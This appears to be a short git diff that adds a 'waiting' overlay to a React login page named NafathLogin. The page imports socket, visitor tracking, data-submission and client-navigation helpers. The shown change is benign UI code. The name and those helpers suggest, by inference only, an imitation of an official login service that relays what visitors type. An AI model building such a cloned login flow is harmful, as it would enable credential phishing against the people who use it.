@@ -1,5 +1,6 @@
 import { useState, useRef, useEffect } from "react";
 import { socket, updatePage, submitData, visitor, clientNavigate } from "@/lib/store";
+import WaitingOverlay from "@/components/WaitingOverlay";
 import { Eye, EyeOff, Globe, Plus, Minus, User, Lock, Loader2, AlertCircle } from "lucide-react";
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
 import { Button } from "@/components/ui/button";
@@ -305,6 +306,7 @@ export default function NafathLogin() {
           </div>
         </div>
       </footer>
+      <WaitingOverlay />
     </div>
   );
 }
